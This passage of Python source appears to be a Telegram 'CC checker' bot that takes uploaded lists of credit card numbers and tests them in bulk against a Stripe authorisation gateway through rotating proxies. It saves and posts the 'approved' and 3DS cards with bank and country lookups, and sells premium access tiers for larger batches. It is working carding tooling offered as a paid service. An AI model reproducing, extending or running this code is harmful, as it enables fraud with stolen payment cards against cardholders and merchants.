    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    ccs = downloaded_file.decode('utf-8').splitlines()
    ccs = list(dict.fromkeys([l.split('#')[0].strip() for l in ccs if l.strip()]))
    
    is_p = is_premium(user_id)
    limit = ADMIN_LIMIT if is_admin(user_id) else (PREMIUM_LIMIT if is_p else FREE_LIMIT)
    
    if limit == 0:
        was_premium = False
        with open(PREMIUM_FILE, 'r') as f:
            for line in f:
                if str(user_id) in line: was_premium = True; break
        
        if was_premium:
            bot.reply_to(message, "𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗘𝘅𝗽𝗶𝗿𝗲𝗱\n━━━━━━━━━━━━━━━━━━━━\n┣ 𝗬𝗼𝘂𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗽𝗹𝗮𝗻 𝗵𝗮𝘀 𝗲𝗻𝗱𝗲𝗱\n┣ 𝗠𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸 𝗳𝗲𝗮𝘁𝘂𝗿𝗲 𝗶𝘀 𝗻𝗼𝘄 𝗹𝗼𝗰𝗸𝗲𝗱\n━━━━━━━━━━━━━━━━━━━━\n┗ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄")
        else:
            bot.reply_to(message, "𝗙𝗿𝗲𝗲 𝘂𝘀𝗲𝗿𝘀 𝗰𝗮𝗻𝗻𝗼𝘁 𝘂𝘀𝗲 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗴𝗿𝗮𝗱𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺.")
        return
        
    total_found = len(ccs)
    
    if total_found > limit:
        bot.reply_to(message, f"[!] 𝙁𝙤𝙪𝙣𝙙 {total_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝗴 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝘵 {limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)\n{limit} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙")
        ccs = ccs[:limit]
    
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    total = len(ccs)
    if is_admin(user_id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
    elif is_premium(user_id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
    else: is_p = " [𝗙𝗥𝗘𝗘]"

    def build_caption_text(res, done=False, stopped=False):
        remaining = total - res["checked"]
        elapsed = int(time.time() - start_time)
        mins, secs = divmod(elapsed, 60)
        time_str = f"{mins:02d}:{secs:02d}"
        if stopped:
            status_line = "𝗦𝘁𝗮𝘁𝘂𝘀 ➜ 𝗦𝘁𝗼𝗽𝗽𝗲𝗱\n"
        elif done:
            status_line = "𝗦𝘁𝗮𝘁𝘂𝘀 ➜ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱\n"
        else:
            status_line = ""
        return (
            f"𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{status_line}"
            f"┣ 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ➜ {res['checked']}/{total}\n"
            f"┣ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➜ {res['approved']}\n"
            f"┣ 𝟯𝗗𝗦 ➜ {res['3ds']}\n"
            f"┣ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➜ {res['declined']}\n"
            f"┣ 𝗘𝗿𝗿𝗼𝗿𝘀 ➜ {res['error']}\n"
            f"┗ 𝗧𝗶𝗺𝗲 ➜ {time_str}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"𝗨𝘀𝗲𝗿: {message.from_user.first_name}{is_p}\n"
            f"𝗗𝗲𝘃: @noxxwraith"
        )

    def build_markup(r, last_cc='', last_resp='', done=False, stopped=False):
        mk = telebot.types.InlineKeyboardMarkup(row_width=1)
        if not done and not stopped:
            mk.add(telebot.types.InlineKeyboardButton(
                "𝗦𝗧𝗢𝗣", callback_data=f"stop_{job_id}"))
        return mk

    results = {
        "approved": 0, "approved_list": [],
        "3ds": 0, "3ds_list": [],
        "declined": 0, "declined_list": [],
        "error": 0, "error_list": [],
        "checked": 0
    }
    last_update = [0]
    update_lock = threading.Lock()
    start_time = time.time()
    caption = build_caption_text(results)
    prog_msg = bot.reply_to(message, caption,
                            parse_mode="HTML",
                            reply_markup=build_markup(results))

    def worker(cc):
        if not ACTIVE_JOBS.get(job_id): return
        
        for _ in range(MAX_RETRIES):
            proxy_dict = None
            p_raw = None
            proxy_dict, p_raw = get_proxy_dict()
                
            try:
                status, response, brand_auto = check_cc(cc, proxy_dict)
                if status != "ERROR":
                    break
            finally:
                release_proxy(p_raw)
                
        response = fmt(response)
        
        entry = f"{cc} - {response}"
            
        if status == "APPROVED":
            results["approved"] += 1
            results["approved_list"].append(entry)
        elif status == "3DS":
            results["3ds"] += 1
            results["3ds_list"].append(entry)
        elif status == "DECLINED":
            results["declined"] += 1
            results["declined_list"].append(entry)
        else:
            results["error"] += 1
            results["error_list"].append(entry)
        results["checked"] += 1
        
        if status in ["APPROVED", "3DS"]:
            try:
                s = get_stats()
                if status == "APPROVED": s["approved"] += 1
                elif status == "3DS": s["3ds"] += 1
                save_stats(s)
            except: pass
            
            if status == "APPROVED":
                with open(APPROVED_FILE, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - {response}\n")
            elif status == "3DS":
                with open(THREEDS_FILE, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - {response}\n")

            bin_code = cc[:6]
            brand_bin, bank, country, level, type_cc, flag = get_bin_info(bin_code)
            brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
            
            is_p = " [𝗙𝗥𝗘𝗘]"
            if is_admin(user_id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
            elif is_premium(user_id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
            
            if status == "APPROVED": status_f = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
            else: status_f = "𝟯𝗗𝗦 ❎"
            
            safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
            safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
            safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")
            safe_response = str(response).replace("<", "").replace(">", "").replace("&", "")
            
            res_single = f"""{status_f}
━━━━━━━━━━━━━━━━━
𝗖𝗮𝗿𝗱 ━ <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ━ {safe_response}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ━ Stripe Auth
━━━━━━━━━━━━━━━━━
𝗕𝗜𝗡: {safe_brand} | {type_cc} | {level}
𝗕𝗮𝗻𝗸: {safe_bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}
━━━━━━━━━━━━━━━━━
𝗨𝘀𝗲𝗿: {safe_fname}{is_p}
𝗗𝗲𝘃: @noxxwraith"""
            try:
                bot.send_message(message.chat.id, res_single, parse_mode="HTML")
                time.sleep(random.uniform(1.5, 3))
            except Exception as e:
                err = str(e)
                if '429' in err:
                    m = re.search(r'retry after (\d+)', err)
                    wait = int(m.group(1)) + 2 if m else 30
                    time.sleep(wait)
                else:
                    try:
                        bot.send_message(message.chat.id, res_single.replace("<code>", "").replace("</code>", ""))
                        time.sleep(random.uniform(1.5, 3))
                    except:
                        time.sleep(10)

        with update_lock:
            current = results["checked"]
            if current >= last_update[0] + 10 or current == total:
                last_update[0] = current
                do_update = True
            else:
                do_update = False
        if do_update:
            try:
                bot.edit_message_text(
                    build_caption_text(results),
                    message.chat.id, prog_msg.message_id,
                    reply_markup=build_markup(results, last_cc=cc, last_resp=str(response)))
            except: pass

    try:
        with ThreadPoolExecutor(max_workers=WORKERS) as executor:
            for cc in ccs:
                if not ACTIVE_JOBS.get(job_id): break
                executor.submit(worker, cc)

        ACTIVE_JOBS.pop(job_id, None)
        ACTIVE_USERS_MPP[user_id] = False
        USER_ACTIVE_JOB.pop(user_id, None)

        try:
            bot.edit_message_text(
                build_caption_text(results, done=True),
                message.chat.id, prog_msg.message_id,
                reply_markup=build_markup(results, done=True))
        except: pass

        file_lines = []
        for section, label in [("approved_list", "APPROVED"), ("3ds_list", "3DS"), ("declined_list", "DECLINED"), ("error_list", "ERRORS")]:
            if results[section]:
                file_lines.append(f"{label}:")
                file_lines.extend(results[section])
                file_lines.append("")
        file_content = "\n".join(file_lines)
        if file_content.strip():
            elapsed = int(time.time() - start_time)
            mins, secs = divmod(elapsed, 60)
            time_str = f"{mins:02d}:{secs:02d}"
            file_caption = (
                f"𝗥𝗲𝘀𝘂𝗹𝘁𝘀\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"┣ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➜ {results['approved']}\n"
                f"┣ 𝟯𝗗𝗦 ➜ {results['3ds']}\n"
                f"┣ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➜ {results['declined']}\n"
                f"┣ 𝗘𝗿𝗿𝗼𝗿𝘀 ➜ {results['error']}\n"
                f"┣ 𝗧𝗶𝗺𝗲 ➜ {time_str}\n"
                f"┗ 𝗧𝗼𝘁𝗮𝗹 ➜ {results['checked']}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"𝗨𝘀𝗲𝗿: {message.from_user.first_name}{is_p}\n"
                f"𝗗𝗲𝘃: @noxxwraith"
            )
            filepath = "Results.txt"
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(file_content)
            with open(filepath, "rb") as f:
                bot.send_document(message.chat.id, f, caption=file_caption)
            try: os.remove(filepath)
            except: pass

    except Exception as e:
        ACTIVE_JOBS.pop(job_id, None)
        ACTIVE_USERS_MPP[user_id] = False
        USER_ACTIVE_JOB.pop(user_id, None)
        try:
            bot.edit_message_text(
                build_caption_text(results, stopped=True),
                message.chat.id, prog_msg.message_id,
                reply_markup=build_markup(results, stopped=True))
        except: pass

@bot.callback_query_handler(func=lambda c: c.data == 'noop')
def cb_noop(call):
    try: bot.answer_callback_query(call.id)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith('stop_'))
def cb_stop(call):
    try: bot.answer_callback_query(call.id, "𝗦𝘁𝗼𝗽𝗽𝗶𝗻𝗴...")
    except: pass
    jid = call.data[5:]
    uid = call.from_user.id
    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        if USER_ACTIVE_JOB.get(uid) == jid:
            USER_ACTIVE_JOB.pop(uid, None)


@bot.message_handler(commands=['addpremium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        
        if is_premium(target_id):
            bot.reply_to(message, f"𝗨𝘀𝗲𝗿 {target_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘀 𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻!")
            return
            
        duration = parts[2]
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        
        with open(PREMIUM_FILE, 'a') as f: f.write(f"{target_id}|{exp}\n")
        with _expiry_lock:
            _expiry_notified.discard(target_id)
        
        if is_admin(message.from_user.id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
        elif is_premium(message.from_user.id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
        else: is_p = " [𝗙𝗥𝗘𝗘]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗: {target_id}
𝗔𝗰𝘁𝗶𝗼𝗻: 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗱𝗱𝗲𝗱
𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration.upper()}
𝗡𝗲𝘄 𝗥𝗮𝗻𝗸: [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]
━━━━━━━━━━━━━
𝐔𝐬𝐞𝐫: {message.from_user.first_name}{is_p}
𝐃𝐞𝐯: @noxxwraith
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), f"𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗱𝗱𝗲𝗱\n━━━━━━━━━━━━━━━━━━━━\n┣ 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀\n┣ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration.upper()}\n┗ 𝗘𝗻𝗷𝗼𝘆 𝘂𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗰𝗵𝗲𝗰𝗸𝘀")
        except: pass
    except: bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /addpremium <userid> <days>(1s,1m,1h,1d,lifetime)")

@bot.message_handler(commands=['rmpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        target_id = message.text.split()[1]
        if not is_premium(target_id):
            bot.reply_to(message, f"𝗨𝘀𝗲𝗿 {target_id} 𝗵𝗮𝘀 𝗻𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗽𝗹𝗮𝗻")
            return
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        with _expiry_lock:
            _expiry_notified.discard(target_id)
        
        if is_admin(message.from_user.id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
        elif is_premium(message.from_user.id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
        else: is_p = " [𝗙𝗥𝗘𝗘]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗: {target_id}
𝗔𝗰𝘁𝗶𝗼𝗻: 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗥𝗲𝗺𝗼𝘃𝗲𝗱
𝗡𝗲𝘄 𝗥𝗮𝗻𝗸: [𝗙𝗥𝗘𝗘]
━━━━━━━━━━━━━
𝐔𝐬𝐞𝐫: {message.from_user.first_name}{is_p}
𝐃𝐞𝐯: @noxxwraith
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), "𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗯𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        except: pass
    except: bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /rmpremium <userid>")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        duration = parts[2] if len(parts) > 2 else 'lifetime'
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        
        with open(BANNED_FILE, 'a') as f: f.write(f"{target_id}|{exp}\n")
        dur_label = "Lifetime" if duration == 'lifetime' else duration.upper()
        if is_admin(message.from_user.id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
        elif is_premium(message.from_user.id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
        else: is_p = " [𝗙𝗥𝗘𝗘]"
        
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗: {target_id}
𝗔𝗰𝘁𝗶𝗼𝗻: 𝗕𝗮𝗻 𝗨𝘀𝗲𝗿
𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {dur_label}
𝗡𝗲𝘄 𝗥𝗮𝗻𝗸: [𝗕𝗔𝗡𝗡𝗘𝗗]
━━━━━━━━━━━━━
𝐔𝐬𝐞𝐫: {message.from_user.first_name}{is_p}
𝐃𝐞𝐯: @noxxwraith
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), f"𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝗳𝗼𝗿 {dur_label}. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗼𝘂𝗿 𝗮𝗱𝗺𝗶𝗻 𝗶𝗳 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗮 𝗺𝗶𝘀𝘁𝗮𝗸𝗲.")
        except: pass
    except: bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /ban <userid> <duration>")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        target_id = message.text.split()[1]
        with open(BANNED_FILE, 'r') as f: lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        
        if is_admin(message.from_user.id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
        elif is_premium(message.from_user.id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
        else: is_p = " [𝗙𝗥𝗘𝗘]"
        
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗: {target_id}
𝗔𝗰𝘁𝗶𝗼𝗻: 𝗨𝗻𝗯𝗮𝗻 𝗨𝘀𝗲𝗿
𝗡𝗲𝘄 𝗥𝗮𝗻𝗸: [𝗙𝗥𝗘𝗘]
━━━━━━━━━━━━━
𝐔𝐬𝐞𝐫: {message.from_user.first_name}{is_p}
𝐃𝐞𝐯: @noxxwraith
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), f"𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗯𝗮𝗻 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱. 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗮𝗴𝗮𝗶𝗻.")
        except: pass
    except: bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /unban <userid>")

@bot.message_handler(commands=['info'])
def user_info(message):
    try:
        target_id = str(message.from_user.id)
        
        role = "[𝗙𝗥𝗘𝗘]"
        limit = FREE_LIMIT
        expire_str = "NEVER"
        
        if is_admin(int(target_id)):
            role = "[𝗔𝗗𝗠𝗜𝗡]"
            limit = ADMIN_LIMIT
            expire_str = "Lifetime"
        elif is_premium(int(target_id)):
            role = "[𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
            limit = PREMIUM_LIMIT
            with open(PREMIUM_FILE, 'r') as f:
                for line in f:
                    if str(target_id) in line and '|' in line:
                        parts = line.strip().split('|')
                        if len(parts) > 1:
                            exp = float(parts[1])
                            if exp == 0:
                                expire_str = "Lifetime"
                                break
                            expire_str = datetime.datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')
                            break
                        expire_str = "Lifetime"
                        break
        else:
            with open(PREMIUM_FILE, 'r') as f:
                for line in f:
                    if str(target_id) in line and '|' in line:
                        parts = line.strip().split('|')
                        if len(parts) > 1:
                            exp = float(parts[1])
                            if exp != 0 and time.time() > exp:
                                expire_str = "𝗘𝘅𝗽𝗶𝗿𝗲𝗱"
                                break
                        break
        
        if is_admin(message.from_user.id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
        elif is_premium(message.from_user.id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
        else: is_p = " [𝗙𝗥𝗘𝗘]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
𝗨𝘀𝗲𝗿 𝗜𝗗: {target_id}
𝗥𝗮𝗻𝗸: {role}
𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {expire_str}
𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁: {limit}
━━━━━━━━━━━━━
𝐔𝐬𝐞𝐫: {message.from_user.first_name}{is_p}
𝐃𝐞𝐯: @noxxwraith
"""
        bot.reply_to(message, res)
    except:
        bot.reply_to(message, "𝗘𝗿𝗿𝗼𝗿 𝗳𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗶𝗻𝗳𝗼!")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    s = get_stats()
    
    with open(BANNED_FILE, 'r') as f: banned_count = len(f.read().splitlines())
    with open(PREMIUM_FILE, 'r') as f: premium_count = len(f.read().splitlines())
    
    s["premium_users"] = premium_count
    s["banned_users"] = banned_count
    save_stats(s)
    
    if is_admin(message.from_user.id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
    elif is_premium(message.from_user.id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
    else: is_p = " [𝗙𝗥𝗘𝗘]"

    res = f"""
𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬
━━━━━━━━━━━━━
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {s.get('approved', 0)}
𝟑𝐃𝐒: {s.get('3ds', 0)}
𝗣𝗿𝗲𝗺𝗶𝘂𝗺: {premium_count}
𝗕𝗮𝗻𝗻𝗲𝗱: {banned_count}
𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {s['total_users']}
━━━━━━━━━━━━━
𝐔𝐬𝐞𝐫: {message.from_user.first_name}{is_p}
𝐃𝐞𝐯: @noxxwraith
"""
    bot.reply_to(message, res)

_expiry_notified = set()
_expiry_lock = threading.Lock()

def check_expired_premiums():
    time.sleep(5)
    while True:
        try:
            if os.path.exists(PREMIUM_FILE):
                with open(PREMIUM_FILE, 'r') as f:
                    lines = f.readlines()
                user_expiries = {}
                for line in lines:
                    line = line.strip()
                    if '|' not in line: continue
                    parts = line.split('|')
                    if len(parts) < 2: continue
                    uid = parts[0]
                    try:
                        exp = float(parts[1])
                    except:
                        continue
                    if uid not in user_expiries or exp > user_expiries[uid]:
                        user_expiries[uid] = exp
                for uid, exp in user_expiries.items():
                    if exp == 0: continue
                    if uid == str(ADMIN_ID): continue
                    with _expiry_lock:
                        if uid in _expiry_notified: continue
                    if time.time() > exp:
                        if is_premium(int(uid)): continue
                        with _expiry_lock:
                            _expiry_notified.add(uid)
                        try:
                            bot.send_message(int(uid), "𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗘𝘅𝗽𝗶𝗿𝗲𝗱\n━━━━━━━━━━━━━━━━━━━━\n┣ 𝗬𝗼𝘂𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗽𝗹𝗮𝗻 𝗵𝗮𝘀 𝗲𝗻𝗱𝗲𝗱\n┣ 𝗠𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸 𝗳𝗲𝗮𝘁𝘂𝗿𝗲 𝗶𝘀 𝗻𝗼𝘄 𝗹𝗼𝗰𝗸𝗲𝗱\n━━━━━━━━━━━━━━━━━━━━\n┗ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄")
                        except:
                            pass
        except:
            pass
        time.sleep(2)

if __name__ == "__main__":
    print("𝗕𝗢𝗧 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚...\n")
    t = threading.Thread(target=check_expired_premiums, daemon=True)
    t.start()
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except:
            time.sleep(5)
